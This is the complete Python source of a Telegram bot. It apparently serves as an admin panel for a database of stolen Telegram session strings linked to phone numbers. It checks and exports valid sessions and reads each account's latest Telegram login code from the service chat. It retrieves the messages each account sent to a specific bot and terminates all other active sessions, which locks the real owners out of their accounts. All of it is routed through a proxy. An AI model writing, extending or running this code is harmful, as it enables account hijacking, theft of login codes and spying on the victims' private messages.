import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from dotenv import load_dotenv
from pymongo import MongoClient
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
from phonenumbers import parse, geocoder
from aiogram.dispatcher.middlewares import BaseMiddleware
from aiogram.dispatcher.handler import CancelHandler
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage

# Load .env
load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
PANEL_TOKEN = os.getenv("PANEL_BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
LA_ADMIN_IDS = json.loads(os.getenv("LA_ADMIN_IDS", "[]"))  # List of light admin IDs

PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]  # Main admin sessions
light_sessions_col = db["light_sessions"]  # Light admin sessions
light_admins_col = db["light_admins"]  # Light admin users

logging.basicConfig(level=logging.INFO)
bot = Bot(token=PANEL_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

def is_main_admin(uid):
    return uid == ADMIN_ID

def is_light_admin(uid):
    return uid in LA_ADMIN_IDS or light_admins_col.find_one({"user_id": uid}) is not None

class AccessControlMiddleware(BaseMiddleware):
    async def on_pre_process_message(self, message: types.Message, data: dict):
        user_id = message.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            raise CancelHandler()

    async def on_pre_process_callback_query(self, callback_query: types.CallbackQuery, data: dict):
        user_id = callback_query.from_user.id
        if not is_main_admin(user_id) and not is_light_admin(user_id):
            raise CancelHandler()

# Register middleware
dp.middleware.setup(AccessControlMiddleware())

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    if is_main_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check Sessions", callback_data='log'),
            InlineKeyboardButton("📂 Export Valids", callback_data='loger'),
            InlineKeyboardButton("🧹 Delete Invalid", callback_data='validel'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("👥 Manage Light Admins", callback_data='manage_la'),
            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
        )
        await message.answer("👑 Welcome, Main Admin! Choose an action:", reply_markup=keyboard)

    elif is_light_admin(message.from_user.id):
        keyboard = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Check My Sessions", callback_data='log'),
            InlineKeyboardButton("➕ Add Sessions", callback_data='addla'),
            InlineKeyboardButton("🔑 Get Telegram Code", callback_data='login'),
            InlineKeyboardButton("📨 FA Bot History", callback_data='fa'),
            InlineKeyboardButton("🗑 Session Management", callback_data='session_management')
        )
        await message.answer("🛡 Welcome, Light Admin. Choose an action:", reply_markup=keyboard)
    else:
        await message.answer("❌ You don't have access to use this bot.")

@dp.callback_query_handler(lambda c: c.data in ['log', 'loger', 'validel', 'login', 'fa', 'addla', 'delall', 'manage_la', 'session_management'])
async def process_callback(callback_query: types.CallbackQuery):
    cmd = callback_query.data
    uid = callback_query.from_user.id

    if cmd == 'log':
        await bot.send_message(uid, "/log")
    elif cmd == 'loger':
        if is_main_admin(uid):
            await bot.send_message(uid, "/loger")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'validel':
        if is_main_admin(uid):
            await bot.send_message(uid, "/validel")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'login':
        await bot.send_message(uid, "Send:\n`/login +1234567890`", parse_mode="Markdown")
    elif cmd == 'fa':
        await bot.send_message(uid, "Send:\n`/fa +1234567890`", parse_mode="Markdown")
    elif cmd == 'addla':
        if is_light_admin(uid):
            await bot.send_message(uid, "Send session list as JSON:\n`/addla [{\"phone\": \"+123\", \"session\": \"...\"}]`", parse_mode="Markdown")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'delall':
        if is_light_admin(uid):
            result = light_sessions_col.delete_many({"owner_id": uid})
            await bot.send_message(uid, f"🗑 Removed your sessions: {result.deleted_count}")
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'manage_la':
        if is_main_admin(uid):
            await manage_light_admins(uid)
        else:
            await bot.send_message(uid, "❌ Not allowed.")
    elif cmd == 'session_management':
        await show_session_management(uid)

    await callback_query.answer()

async def show_session_management(user_id):
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📋 List My Sessions", callback_data='list_my_sessions'),
        InlineKeyboardButton("🗑 Delete All Sessions", callback_data='delete_all_sessions'),
        InlineKeyboardButton("🔍 Delete By Phone", callback_data='delete_by_phone'),
        InlineKeyboardButton("🚪 Kick Other Sessions", callback_data='kick_other_sessions')
    )
    await bot.send_message(user_id, "🛠 Session Management:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data in ['list_my_sessions', 'delete_all_sessions', 'delete_by_phone', 'kick_other_sessions'])
async def session_management_handler(callback_query: types.CallbackQuery):
    cmd = callback_query.data
    uid = callback_query.from_user.id
    
    if cmd == 'list_my_sessions':
        await list_my_sessions(uid)
    elif cmd == 'delete_all_sessions':
        await confirm_delete_all_sessions(uid)
    elif cmd == 'delete_by_phone':
        await bot.send_message(uid, "Send phone number to delete session:\n`/delete_phone +1234567890`", parse_mode="Markdown")
    elif cmd == 'kick_other_sessions':
        await bot.send_message(uid, "Send phone number to kick other sessions:\n`/kickall +1234567890`", parse_mode="Markdown")
    
    await callback_query.answer()

async def list_my_sessions(user_id):
    if is_main_admin(user_id):
        sessions = list(sessions_col.find({}))
    else:
        sessions = list(light_sessions_col.find({"owner_id": user_id}))
    
    if not sessions:
        await bot.send_message(user_id, "❌ No sessions found.")
        return
    
    text = "📋 Your Sessions:\n\n"
    for session in sessions:
        status = "✅ Valid" if session.get("valid", True) else "❌ Invalid"
        text += f"📱 {session['phone']} - {status}\n"
    
    await bot.send_message(user_id, text)

async def confirm_delete_all_sessions(user_id):
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("Yes, delete all", callback_data='confirm_delete_all'),
        InlineKeyboardButton("Cancel", callback_data='cancel_delete_all')
    )
    await bot.send_message(user_id, "⚠️ Are you sure you want to delete ALL your sessions?", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data in ['confirm_delete_all', 'cancel_delete_all'])
async def delete_all_sessions_handler(callback_query: types.CallbackQuery):
    cmd = callback_query.data
    uid = callback_query.from_user.id
    
    if cmd == 'confirm_delete_all':
        if is_main_admin(uid):
            result = sessions_col.delete_many({})
        else:
            result = light_sessions_col.delete_many({"owner_id": uid})
        await bot.send_message(uid, f"🗑 Deleted {result.deleted_count} sessions.")
    else:
        await bot.send_message(uid, "❌ Cancelled.")
    
    await callback_query.answer()

@dp.message_handler(commands=['delete_phone'])
async def delete_session_by_phone(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    phone = message.get_args().strip()
    if not phone.startswith('+'):
        await message.reply("❗️ Use format: /delete_phone +1234567890")
        return

    if is_main_admin(message.from_user.id):
        result = sessions_col.delete_one({"phone": phone})
    else:
        result = light_sessions_col.delete_one({"phone": phone, "owner_id": message.from_user.id})
    
    if result.deleted_count > 0:
        await message.reply(f"✅ Session with phone {phone} deleted.")
    else:
        await message.reply("❌ Session not found.")

async def manage_light_admins(admin_id):
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("➕ Add Light Admin", callback_data='add_light_admin'),
        InlineKeyboardButton("➖ Remove Light Admin", callback_data='remove_light_admin'),
        InlineKeyboardButton("📋 List Light Admins", callback_data='list_light_admins')
    )
    await bot.send_message(admin_id, "👥 Light Admins Management:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data in ['add_light_admin', 'remove_light_admin', 'list_light_admins'])
async def light_admin_management(callback_query: types.CallbackQuery):
    cmd = callback_query.data
    uid = callback_query.from_user.id
    
    if not is_main_admin(uid):
        await bot.send_message(uid, "❌ Not allowed.")
        return
    
    if cmd == 'add_light_admin':
        await bot.send_message(uid, "Send user ID to add as light admin:\n`/add_la 123456789`", parse_mode="Markdown")
    elif cmd == 'remove_light_admin':
        await bot.send_message(uid, "Send user ID to remove from light admins:\n`/remove_la 123456789`", parse_mode="Markdown")
    elif cmd == 'list_light_admins':
        admins = list(light_admins_col.find({}))
        if not admins:
            await bot.send_message(uid, "No light admins added yet.")
            return
        
        text = "📋 Light Admins List:\n\n"
        text += "\n".join([f"👤 {admin['user_id']} - @{admin.get('username', 'unknown')}" for admin in admins])
        await bot.send_message(uid, text)

@dp.message_handler(commands=['add_la'])
async def add_light_admin_cmd(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return
    
    try:
        user_id = int(message.get_args().strip())
        user = await bot.get_chat(user_id)
        
        light_admins_col.update_one(
            {"user_id": user_id},
            {"$set": {"user_id": user_id, "username": user.username}},
            upsert=True
        )
        await message.reply(f"✅ Added light admin: {user_id} (@{user.username})")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

@dp.message_handler(commands=['remove_la'])
async def remove_light_admin_cmd(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return
    
    try:
        user_id = int(message.get_args().strip())
        result = light_admins_col.delete_one({"user_id": user_id})
        
        if result.deleted_count > 0:
            light_sessions_col.delete_many({"owner_id": user_id})
            await message.reply(f"✅ Removed light admin and their sessions: {user_id}")
        else:
            await message.reply("❌ Light admin not found.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

@dp.message_handler(commands=['addla'])
async def add_light_admin_session(message: types.Message):
    if not is_light_admin(message.from_user.id):
        return
    
    try:
        data = json.loads(message.get_args())
        if not isinstance(data, list):
            raise ValueError("Format must be a JSON list")

        added = 0
        for item in data:
            phone = item.get("phone", "").strip()
            session = item.get("session")
            if phone and session:
                light_sessions_col.update_one(
                    {"phone": phone, "owner_id": message.from_user.id},
                    {"$set": {
                        "phone": phone, 
                        "session": session,
                        "owner_id": message.from_user.id,
                        "owner_username": message.from_user.username
                    }},
                    upsert=True
                )
                added += 1
        await message.reply(f"✅ Sessions added: {added}")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

@dp.message_handler(commands=['log'])
async def cmd_log(message: types.Message):
    if is_main_admin(message.from_user.id):
        sessions = list(sessions_col.find({}))
        col_name = "MAIN"
    else:
        sessions = list(light_sessions_col.find({"owner_id": message.from_user.id}))
        col_name = f"LIGHT ADMIN {message.from_user.id}"
    
    if not sessions:
        await message.answer("❌ No sessions found.")
        return

    await message.answer(f"🔍 Checking {col_name} sessions...")
    results = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                results.append(f"❌ {phone} — Invalid session")
            else:
                me = await client.get_me()
                country = geocoder.description_for_number(parse(phone, None), "en")
                premium = getattr(me, 'premium', False)
                blocked = bool(getattr(me, 'restriction_reason', []))
                results.append(f"✅ {phone} | {country} | Premium: {'Yes' if premium else 'No'} | Blocked: {'Yes' if blocked else 'No'}")
        except Exception as e:
            results.append(f"❌ {phone} — Error: {e}")
        finally:
            await client.disconnect()

    text = "\n".join(results)
    for chunk in [text[i:i+4000] for i in range(0, len(text), 4000)]:
        await message.answer(chunk)

@dp.message_handler(commands=['loger'])
async def cmd_loger(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return

    sessions = list(sessions_col.find({}))
    valid_sessions = []
    for session in sessions:
        phone = session.get("phone")
        session_str = session.get("session")
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if await client.is_user_authorized():
                valid_sessions.append({"phone": phone, "session": session_str})
        except:
            pass
        finally:
            await client.disconnect()

    if not valid_sessions:
        await message.answer("❌ No valid sessions.")
        return

    with open("valid_sessions.txt", "w") as f:
        json.dump(valid_sessions, f, indent=2)

    await message.answer_document(open("valid_sessions.txt", "rb"))

@dp.message_handler(commands=['validel'])
async def cmd_validel(message: types.Message):
    if not is_main_admin(message.from_user.id):
        return

    sessions = list(sessions_col.find({}))
    deleted = 0
    for session in sessions:
        client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                sessions_col.delete_one({"_id": session["_id"]})
                deleted += 1
        except:
            sessions_col.delete_one({"_id": session["_id"]})
            deleted += 1
        finally:
            await client.disconnect()

    await message.answer(f"🧹 Invalid sessions removed: {deleted}")

@dp.message_handler(commands=['login'])
async def cmd_login(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗️ Use format: /login +1234567890")
        return

    if is_main_admin(message.from_user.id):
        session = sessions_col.find_one({"phone": args})
    else:
        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
    
    if not session:
        await message.reply("❌ Session not found.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        history = await client(GetHistoryRequest(peer=777000, limit=1, offset_date=None,
                                             offset_id=0, max_id=0, min_id=0, add_offset=0, hash=0))
        if history.messages:
            await message.reply(f"📨 Last Telegram code:\n\n`{history.messages[0].message}`", parse_mode="Markdown")
        else:
            await message.reply("⚠️ No messages from Telegram.")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        await client.disconnect()

@dp.message_handler(commands=['fa'])
async def cmd_fa(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗️ Use format: /fa +1234567890")
        return

    if is_main_admin(message.from_user.id):
        session = sessions_col.find_one({"phone": args})
    else:
        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
    
    if not session:
        await message.reply("❌ Session not found.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        
        history = await client(GetHistoryRequest(
            peer='T686T_bot',
            limit=100,
            offset_date=None,
            offset_id=0,
            max_id=0,
            min_id=0,
            add_offset=0,
            hash=0
        ))
        
        if not history.messages:
            await message.reply("⚠️ No messages in @T686T_bot.")
            return

        me = await client.get_me()
        user_messages = [
            msg for msg in history.messages 
            if hasattr(msg, 'out') and msg.out
        ]

        if not user_messages:
            await message.reply("⚠️ No messages sent by you found in @T686T_bot.")
            return

        output = []
        for msg in user_messages[:25]:
            if hasattr(msg, 'message') and msg.message:
                date_str = msg.date.strftime('%Y-%m-%d %H:%M') if hasattr(msg, 'date') else 'unknown date'
                output.append(f"📤 {date_str}: {msg.message}")
        
        if not output:
            await message.reply("⚠️ No valid messages found.")
            return
            
        await message.reply(f"📤 Your messages to @T686T_bot:\n\n" + "\n\n".join(output))
        
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")
    finally:
        await client.disconnect()

@dp.message_handler(commands=['kickall'])
async def cmd_kickall(message: types.Message):
    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
        return

    args = message.get_args().strip()
    if not args.startswith('+'):
        await message.reply("❗️ Use format: /kickall +1234567890")
        return

    if is_main_admin(message.from_user.id):
        session = sessions_col.find_one({"phone": args})
    else:
        session = light_sessions_col.find_one({"phone": args, "owner_id": message.from_user.id})
    
    if not session:
        await message.reply("❌ Session not found.")
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        
        result = await client(GetAuthorizationsRequest())
        
        if not result.authorizations:
            await message.reply("⚠️ No active sessions found.")
            return

        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("Terminate ALL other sessions", callback_data=f'terminate_all:{args}'),
            InlineKeyboardButton("Keep all sessions", callback_data='cancel_terminate')
        )
        
        await message.reply(
            f"🔍 Found {len(result.authorizations)} active sessions for {args}.\n"
            "Choose action:",
            reply_markup=keyboard
        )
        
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")
    finally:
        await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('terminate_all:') or c.data == 'cancel_terminate')
async def terminate_sessions_handler(callback_query: types.CallbackQuery):
    if callback_query.data == 'cancel_terminate':
        await bot.send_message(callback_query.from_user.id, "❌ Cancelled.")
        await callback_query.answer()
        return
    
    phone = callback_query.data.split(':')[1]
    uid = callback_query.from_user.id
    
    if is_main_admin(uid):
        session = sessions_col.find_one({"phone": phone})
    else:
        session = light_sessions_col.find_one({"phone": phone, "owner_id": uid})
    
    if not session:
        await bot.send_message(uid, "❌ Session not found.")
        await callback_query.answer()
        return

    client = TelegramClient(StringSession(session["session"]), API_ID, API_HASH, proxy=proxy)
    try:
        await client.connect()
        
        current_session = await client(GetAuthorizationsRequest())
        current_hash = None
        
        for auth in current_session.authorizations:
            if auth.current:
                current_hash = auth.hash
                break
        
        terminated = 0
        for auth in current_session.authorizations:
            if not auth.current:
                try:
                    await client(ResetAuthorizationRequest(hash=auth.hash))
                    terminated += 1
                except:
                    pass
        
        await bot.send_message(uid, f"✅ Terminated {terminated} other sessions for {phone}.")
        
    except Exception as e:
        await bot.send_message(uid, f"❌ Error: {str(e)}")
    finally:
        await client.disconnect()
        await callback_query.answer()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
